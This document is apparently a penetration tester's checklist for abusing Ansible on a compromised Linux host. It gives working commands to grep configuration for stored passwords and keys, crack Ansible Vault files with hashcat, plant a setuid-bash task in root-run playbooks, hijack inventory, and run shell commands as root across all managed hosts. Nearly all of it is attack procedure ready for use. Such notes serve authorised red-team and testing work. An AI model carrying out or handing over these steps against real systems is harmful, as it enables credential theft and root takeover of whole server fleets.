# Ansible Abuse

## Before I start
- [ ] Control node or managed host foothold; look for /etc/ansible: :Pb linux-creds

## Loot
cat /etc/ansible/ansible.cfg
cat /etc/ansible/hosts
grep -rniE 'ansible_password|ansible_become_pass|password:|api_key|private_key' /etc/ansible /opt /srv /home 2>/dev/null
- [ ] ansible.cfg [privilege_escalation] block tells me the become path to root
- [ ] private_key_file = free SSH key

## Crack the vault
find / -name '*.yml' 2>/dev/null | xargs grep -l 'ANSIBLE_VAULT' 2>/dev/null
ansible2john vault.yml > vault.hash
hashcat -m 16900 vault.hash targeted.txt -r /usr/share/hashcat/rules/best64.rule
ansible-vault decrypt vault.yml --ask-vault-pass
- [ ] PBKDF2 10k rounds — slow; targeted lists only: :Pb hash-cracking

## Writable playbook/inventory = root
crontab -l; ls -la /etc/cron*; ps aux | grep -i ansible
- [ ] Root cron/ansible-pull runs playbooks I can edit → inject task: shell: chmod u+s /bin/bash → bash -p
- [ ] Writable inventory → point a host at my box, harvest root's next run: :Pb cron

## I can run ansible myself
ansible all -i /etc/ansible/hosts -m shell -a 'id' --become
ansible-playbook -i inventory pwn.yml --become
- [ ] Passwordless become = root across every managed host in one shot

## If it fails
- [ ] become asks for a password → crack the vault (it usually IS the become password)
- [ ] No cron pulls → check CI/CD (Jenkins) invoking playbooks: :Pb jenkins

## Next
- [ ] Fleet root → cred sweep everywhere: :Pb linux-creds
- [ ] Recovered service passwords → reuse: :Pb spraying
